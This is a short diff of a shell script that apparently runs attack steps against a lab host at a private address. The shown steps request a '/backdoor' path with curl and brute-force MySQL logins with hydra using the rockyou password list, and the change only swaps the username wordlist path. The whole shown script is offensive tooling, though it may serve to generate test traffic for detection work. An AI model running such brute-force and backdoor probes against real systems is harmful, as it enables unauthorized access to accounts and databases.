@@ -10,4 +10,4 @@ echo "[3] HTTP access to /backdoor"
 curl http://172.28.0.15/backdoor
 
 echo "[4] Brute Force MySQL"
-hydra -L /usr/share/wordlists/names.txt -P /usr/share/wordlists/rockyou.txt 172.28.0.15 mysql
+hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt 172.28.0.15 mysql
